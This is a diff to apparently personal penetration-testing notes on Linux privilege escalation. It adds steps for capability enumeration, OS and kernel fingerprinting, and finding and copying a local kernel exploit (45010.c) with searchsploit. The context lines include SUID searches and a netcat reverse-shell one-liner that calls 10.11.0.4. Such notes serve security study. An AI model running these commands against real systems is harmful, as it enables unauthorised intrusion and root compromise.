@@ -27,6 +27,9 @@ find / -writable -type d 2>/dev/null
 find all permissions with SUID set. (allows you to
 find / -perm -u=s -type f 2>/dev/null
 
+find all capabilities with SUID
+/usr/sbin/getcap -r / 2>/dev/null
+
 Mounts - In summary, mount shows the current mount status, /etc/fstab represents the expected configuration, and lsblk provides information about the block devices and their partitions present on the system.
 
 cat /etc/fstab
@@ -69,5 +72,28 @@ grep "CRON" /var/log/syslog
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
 - this delete the fifo pipe if exists, creates another one, cats its contents to a shell with interactive i flag and redirect errors to error log, write to fifo pipe
 
+kernal exploits...
+get os flavor info
+cat /etc/issue
+result : Ubuntu 16.04.4 LTS \n \l
 
+get kernal info
+uname -r 
+4.4.0-116-generic
+
+arch 
+x86_64
+search for exploit
+
+put it all together...
+
+searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
+use the newest version that matches what you got... I'm assuming you can tell which one is newer using the number at the end example 45010 is newer than 42275
+also becareful that 4.13.9 kernal is newer than 4.4.0.... I'm not sure why I immediately assumed the opposite.
+
+Copy to your pwd
+cp /usr/share/exploitdb/exploits/linux/local/45010.c . 
+
+cat first 20 lines of it to search for instructions
+head 45010.c -n 20
 
